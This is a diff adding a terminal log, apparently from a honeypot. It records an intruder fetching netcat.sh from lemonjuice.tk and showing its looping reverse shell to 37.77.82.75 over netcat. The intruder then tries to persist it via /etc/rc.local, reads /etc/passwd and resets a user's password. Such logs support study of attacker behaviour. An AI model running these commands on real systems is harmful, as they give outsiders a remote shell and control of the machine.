@@ -1,0 +1,522 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# ls[1D[1P[1D[1Pp[1D[1Pifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:~# d[1D[1Pdc [1D[1P[1D[1P[1D[1Pcd /etc/IRC[1D[1P[1D[1P[1D[1P[1D[1P/adminsec
+[4lbash: cd: /etc/adminsec: No such file or directory
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# mkdir /etc/adminsec
+[4l[4hAWSWeb:~# cd /etc/admins[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /etc/adminsec/
+[4l[4hAWSWeb:/etc/adminsec# ls
+[4l[4hAWSWeb:/etc/adminsec# wget lemonjuice.tk/netcat.sh
+[4l--2014-05-23 12:04:11--  http://lemonjuice.tk/netcat.sh
+Connecting to lemonjuice.tk:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 81 (81bytes) [text/x-sh]
+Saving to: `netcat.sh
+
+100% [=======================================>] 81           0K/s  eta 0s100%[======================================>] 81           0K/s
+
+2014-05-23 12:04:12 (0 KB/s) - `netcat.sh' saved [81/81]
+[4hAWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# chmo [1D[1Pd 777 net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod 777 netcat.sh 
+[4l[4hAWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# sud [1D[1P[1D[1P[1D[1P[1D[1Pnano /etc/rc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano /etc/rc.local 
+bash: nano: command not found
+AWSWeb:/etc/adminsec# sud[1D[1P[1D[1P[1D[1Papt-get int[1D[1Pstall nano
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nano 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 158.2kB of archives.
+After this operation, 347.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main nano 1.28-10 [158.2kB]
+Fetched 158.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking nano (from .../archives/nano_1.28-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up nano (1.28-10) ...
+[4hAWSWeb:/etc/adminsec# nanoj /etc/rc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnanoj /etc/rc.local 
+bash: nanoj: command not found
+AWSWeb:/etc/adminsec# nano /etc/rc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano /etc/rc.local 
+[4lnano: Segmentation fault
+[4hAWSWeb:/etc/adminsec# cat[1D[1P[1D[1P[1D[1P/etc/r[1D[1Prc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P/etc/rc.local < ""[1D[1Plecl[1D[1P[1D[1P[1D[1P[1D[1P/etc/admn[1D[1Pinsec/netcatsg[1D[1P[1D[1P.sh"
+bash: /etc/rc.local: command not found
+AWSWeb:/etc/adminsec# echo "/etc/adminsec/netcat.sh" > /etc/rc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pecho "/etc/adminsec/netcat.sh" > /etc/rc.local 
+[4l/etc/adminsec/netcat.sh > /etc/rc.local
+[4hAWSWeb:/etc/adminsec# cat /etc/rc.lo[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /etc/rc.local 
+[4lcat: /etc/rc.local: No such file or directory
+[4hAWSWeb:/etc/adminsec# uame[1D[1P[1D[1P[1D[1Pname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# cat /ec/rc[1D[1P[1D[1P[1D[1P[1D[1Pet[1D[1P[1D[1Ptc.rc[1D[1P[1D[1P[1D[1Pr[1D[1P/rcl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+rc4.d    rcS.d    rc6.d    rc5.d    rc.local rc1.d    rc3.d    rc0.d    rc2.d    
+AWSWeb:/etc/adminsec# cat /etc/rc.[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /etc/rc.local 
+[4lcat: /etc/rc.local: No such file or directory
+[4hAWSWeb:/etc/adminsec# vi rc.[1D[1P[1D[1P[1D[1P[1D[1P /etc/,rc[1D[1P[1D[1P[1D[1Prc.l[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi /etc/rc.local 
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# ./net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./netcat.sh 
+bash: ./netcat.sh: command not found
+AWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# sh ./[1D[1P[1D[1Pnet[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psh netcat.sh &
+[4l[4hAWSWeb:/etc/adminsec# sh net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psh netcat.sh 
+[4l[4hAWSWeb:/etc/adminsec# cat net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat netcat.sh 
+[4l#!/bin/sh
+while [ true ]
+do
+    nc 37.77.82.75 21 -e /bin/bash
+    sleep 10
+done
+[4hAWSWeb:/etc/adminsec# pin [1D[1Pg 37.77.82.75
+[4lPING 37.77.82.75 (37.77.82.75) 56(84) bytes of data.
+64 bytes from 37.77.82.75 (37.77.82.75): icmp_seq=1 ttl=50 time=48.3 ms
+64 bytes from 37.77.82.75 (37.77.82.75): icmp_seq=2 ttl=50 time=41.5 ms
+--- 37.77.82.75 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:/etc/adminsec# nc 37.77.82.75 21 -e /bin/bash
+bash: nc: command not found
+AWSWeb:/etc/adminsec# sudo apt-get instll nc[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pall nc
+bash: sudo: command not found
+AWSWeb:/etc/adminsec# apt-get install netcat
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  netcat 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 878.2kB of archives.
+After this operation, 1931.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main netcat 0.2-10 [878.2kB]
+Fetched 878.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking netcat (from .../archives/netcat_0.2-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up netcat (0.2-10) ...
+[4hAWSWeb:/etc/adminsec# ./[1D[1P[1D[1Psh net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psh netcat.sh &
+[4l[4hAWSWeb:/etc/adminsec# nc
+bash: nc: command not found
+AWSWeb:/etc/adminsec# nc[1D[1Petcat
+[4lnetcat: Segmentation fault
+[4hAWSWeb:/etc/adminsec# nano /etc/[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnet[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnano netcat.sh 
+[4lnano: Segmentation fault
+[4hAWSWeb:/etc/adminsec# vi
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/etc/adminsec# ls[1D[1P[1D[1Pvi net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi netcat.sh [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pvi netcat.sh 
+[4lE558: Terminal entry not found in terminfo
+[4hAWSWeb:/etc/adminsec# cat net[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat netcat.sh 
+[4l#!/bin/sh
+while [ true ]
+do
+    nc 37.77.82.75 21 -e /bin/bash
+    sleep 10
+done
+[4hAWSWeb:/etc/adminsec# nc 37.77.82.75 21 -e /bin/bash
+bash: nc: command not found
+AWSWeb:/etc/adminsec# sud [1D[1Po apt-get installnc[1D[1P[1D[1P [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Papt-get int[1D[1Pstall nc
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  nc 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 695.2kB of archives.
+After this operation, 1529.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main nc 0.15-1 [695.2kB]
+Fetched 695.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking nc (from .../archives/nc_0.15-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up nc (0.15-1) ...
+[4hAWSWeb:/etc/adminsec# nc 37.77.82.75 21 -e /bin/bash
+[4lnc: Segmentation fault
+[4hAWSWeb:/etc/adminsec# cat /etc/passd
+[4lcat: /etc/passd: No such file or directory
+[4hAWSWeb:/etc/adminsec# cat /etc[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Papt0[1D[1P-get install zsh
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  zsh 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 295.2kB of archives.
+After this operation, 649.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main zsh 1.30-4 [295.2kB]
+Fetched 295.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking zsh (from .../archives/zsh_1.30-4_i386.deb) ...
+Processing triggers for man-db ...
+Setting up zsh (1.30-4) ...
+[4hAWSWeb:/etc/adminsec# zsh[1D[1Ph
+[4lzsh: Segmentation fault
+[4hAWSWeb:/etc/adminsec# sh
+[4l[4hAWSWeb:/etc/adminsec# cat /etc/passwd
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hAWSWeb:/etc/adminsec# addusr[1D[1Per test
+[4lAdding user `test' ...
+Adding new group `test' (1001) ...
+Adding new user `test' (1001) with group `test' ...
+Creating home directory `/home/test' ...
+Copying files from `/etc/skel' ...
+Password: 
+Password again: 
+
+Changing the user information for test
+Enter the new value, or press ENTER for the default
+        Username []: 
+Must enter a value!
+
+Must enter a value!
+        Username []:         Username []: d
+        Full Name []: d
+d        Room Number []: d
+        Work Phone []: d
+        Home Phone []: d
+        Mobile Phone []: d
+        Country []: d
+        City []: d
+        Language []: d
+        Favorite movie []: d
+        Other []: d
+Is the information correct? [Y/n] y
+ERROR: Some of the information you entered is invalid
+Deleting user `test' ...
+Deleting group `test' (1001) ...
+Deleting home directory `/home/test' ...
+Try again? [Y/n] y
+
+Changing the user information for test
+Enter the new value, or press ENTER for the default
+        Username []: 
+Must enter a value!
+        Username []: Hey
+        Full Name []: me
+        Room Number []: 22
+        Work Phone []: 0qw4341441[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P213213213151
+        Home Phone []: 09212114241
+        Mobile Phone []: 04345
+        Country []: U
+        City []: Jn=enil
+        Language []: English
+        Favorite movie []: Iron Man
+        Other []: Like m[1D[1PCo[1D[1Po[1D[1P[1D[1Pc[1D[1PCookies
+Is the information correct? [Y/n] y[1D[1PY
+Ok, starting over
+
+Changing the user information for test
+Enter the new value, or press ENTER for the default
+        Username []: Hey
+        Full Name []: me
+        Room Number []: 22
+        Work Phone []: 08873876478
+        Home Phone []: 88t7t87t8
+        Mobile Phone []: 7644907
+        Country []: ff
+        City []: ddsadasaw
+        Language []: English
+        Favorite movie []: Ironxman
+        Other []: 
+Must enter a value!
+        Other []: Cookies
+Is the information correct? [Y/n] 
+Ok, starting over
+
+Changing the user information for test
+Enter the new value, or press ENTER for the default
+        Username []: ^C
+[4hAWSWeb:/etc/adminsec# passwd[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat /etc/passwd
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hAWSWeb:/etc/adminsec# passwd rick[1D[1Phard
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:/etc/adminsec# su rick[1D[1Phrd[1D[1P[1D[1Pard
+[4l[4hAWSWeb:/etc/adminsec# lw[1D[1Ps
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hAWSWeb:/etc/adminsec# cd ~
+[4lbash: cd: ~: No such file or directory
+[4hAWSWeb:/etc/adminsec# pwd[1D[1P[1D[1P[1D[1Pcd /home
+[4l[4hAWSWeb:/home# ls
+[4lrichard 
+[4hAWSWeb:/home# mkdir test
+[4l[4hAWSWeb:/home# ls -l
+[4ldrwxr-xr-x 1 root root 4096 2014-05-23 12:19 .
+drwxr-xr-x 1 root root 4096 2014-05-23 12:19 ..
+drwxr-xr-x 1 1000 1000 4096 2009-11-06 11:22 richard
+drwxr-xr-x 1 root root 4096 2014-05-23 12:19 test
+[4hAWSWeb:/home# su[1D[1P[1D[1Pexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit[4D[Kls -l[5D[Kexit[4D[Kls -l[5D[Kmkdir test[10D[Kls -l[5D[Kmkdir test[10D[Kls[2D[Kmkdir test[10D[Kls -l[5D[Kexit[4D[Kls
+[4l[4hlocalhost:~# pwd
+[4l/root
+[4hlocalhost:~# cd [1D[1P[1D[1P[1D[1Pcd [1D[1P[1D[1P[1D[1Phtop
+bash: htop: command not found
+localhost:~# nano
+[4lnano: Segmentation fault
+[4hlocalhost:~# cd /et[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Petc/[1D[1P[1D[1P[1D[1P[1D[1Pcd /etc/[1D[1P[1D[1P[1D[1P[1D[1Petc/admin[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd /etc/adminsec/
+[4l[4hlocalhost:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hlocalhost:/etc/adminsec# ./s[1D[1Pnet[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./netcat.sh 
+bash: ./netcat.sh: command not found
+localhost:/etc/adminsec# [K./netcat.sh [1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1Dsh 
+[4l[4hlocalhost:/etc/adminsec# [Ksh ./netcat.sh [15D[K./netcat.sh [12D[Ksh ./netcat.sh [1D[1C[15D[K./netcat.sh [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat netcat
+[4lcat: netcat: No such file or directory
+[4hlocalhost:/etc/adminsec# [Kcat netcat[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcat netcat.sh 
+[4l#!/bin/sh
+while [ true ]
+do
+    nc 37.77.82.75 21 -e /bin/bash
+    sleep 10
+done
+[4hlocalhost:/etc/adminsec# [Kcat netcat.sh [14D[Kcat netcat[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pnc 37.77.82.75 21 -e /bin/bash
+[4lnc: Segmentation fault
+[4hlocalhost:/etc/adminsec# [Knc 37.77.82.75 21 -e /bin/bash
+[4lnc: Segmentation fault
+[4hlocalhost:/etc/adminsec# env -i bash --norc
+bash: env: command not found
+localhost:/etc/adminsec# upime[1D[1P[1D[1P[1D[1Ptime
+[4l 12:21:23 up 211 days, 17:42,  1 users, load averages: 0.09 0.05 0.05
+[4hlocalhost:/etc/adminsec# sage
+bash: sage: command not found
+localhost:/etc/adminsec# zsh[3D
+[4lzsh: Segmentation fault
+[4hlocalhost:/etc/adminsec# s[1D[1Psu
+[4l[4hlocalhost:/etc/adminsec# [Ksus[1D[1P [1D[1P[1D[1P[1D[1Pcat /etc/passwd
+[4lroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+richard:x:1000:1000:richard,,,:/home/richard:/bin/bash
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+[4hlocalhost:/etc/adminsec# c[1D[1Psu rick[1D[1Phard
+[4l[4hlocalhost:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hlocalhost:/etc/adminsec# pki
+bash: pki: command not found
+localhost:/etc/adminsec# ipsec
+bash: ipsec: command not found
+localhost:/etc/adminsec# s[1D[1Pls[1D[1P[1D[1Phtop
+bash: htop: command not found
+localhost:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hlocalhost:/etc/adminsec# gt[1D[1P[1D[1Pop[1D[1P[1D[1Ptop
+bash: top: command not found
+localhost:/etc/adminsec# ls
+[4lnetcat.sh 
+[4hlocalhost:/etc/adminsec# su[1D[1P[1D[1Papt-get install su
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  su 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 851.2kB of archives.
+After this operation, 1872.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main su 0.1-6 [851.2kB]
+Fetched 851.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking su (from .../archives/su_0.1-6_i386.deb) ...
+Processing triggers for man-db ...
+Setting up su (0.1-6) ...
+[4hlocalhost:/etc/adminsec# su roc[1D[1P[1D[1Pickh[1D[1P[1D[1Phard
+[4l[4hlocalhost:/etc/adminsec# s[1D[1Ppwd
+[4l/etc/adminsec
+[4hlocalhost:/etc/adminsec# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:/etc/adminsec# apt-get [1D[1P update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:/etc/adminsec# [Kapt-get update[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1Dsudo 
+bash: sudo: command not found
+localhost:/etc/adminsec# su root
+[4l[4hlocalhost:/etc/adminsec# [Ksu root[7D[Ksudo apt-get update[19D[Ksu root[7D[Ksudo apt-get update
+bash: sudo: command not found
+localhost:/etc/adminsec# [Ksudo apt-get update[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1P[1P[1P[1P[1P
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:/etc/adminsec# s[1D[1Papt-get instll [1D[1P[1D[1P[1D[1P[1D[1Pall [1D[1P[1D[1P[1D[1P[1D[1Ptall top
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  top 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 211.2kB of archives.
+After this operation, 464.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main top 1.5-3 [211.2kB]
+Fetched 211.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking top (from .../archives/top_1.5-3_i386.deb) ...
+Processing triggers for man-db ...
+Setting up top (1.5-3) ...
+[4hlocalhost:/etc/adminsec# [Kapt-get install top[1D[1P[1D[1P[1D[1P[1D[1P upgrade
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  upgrade 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 891.2kB of archives.
+After this operation, 1960.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main upgrade 1.18-8 [891.2kB]
+Fetched 891.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking upgrade (from .../archives/upgrade_1.18-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up upgrade (1.18-8) ...
+[4hlocalhost:/etc/adminsec# [Kapt-get install upgrade[23D[Kapt-get install top[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pupdate
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:/etc/adminsec# [Kapt-get update[1D[1P[1D[1P[1D[1P[1D[1Pgrade
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:/etc/adminsec# ls[1D[1P[1D[1P[Kapt-get upgrade[15D[Kapt-get update
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hlocalhost:/etc/adminsec# [Kapt-get update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1D[1D[1D[1D[1D[1D[1Dsdo [1C[1C[1C[1C[1C[1C[1C[1Cupdate
+bash: sdo: command not found
+localhost:/etc/adminsec# [Ksdo apt-get update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pmkdir test
+[4l[4hlocalhost:/etc/adminsec# ls
+[4lnetcat.sh test      
+[4hlocalhost:/etc/adminsec# ls a[1D[1P-a
+[4l.         ..        netcat.sh test      
+[4hlocalhost:/etc/adminsec# [Kls -a[1D[1Pl
+[4ldrwxr-xr-x 1 root root 4096 2014-05-23 12:29 .
+drwxr-xr-x 1 root root 4096 2014-05-23 12:29 ..
+-rw-r--r-- 1 root root   81 2014-05-23 12:04 netcat.sh
+drwxr-xr-x 1 root root 4096 2014-05-23 12:29 test
+[4hlocalhost:/etc/adminsec# ex[1D[1Pxit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# [Kexit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
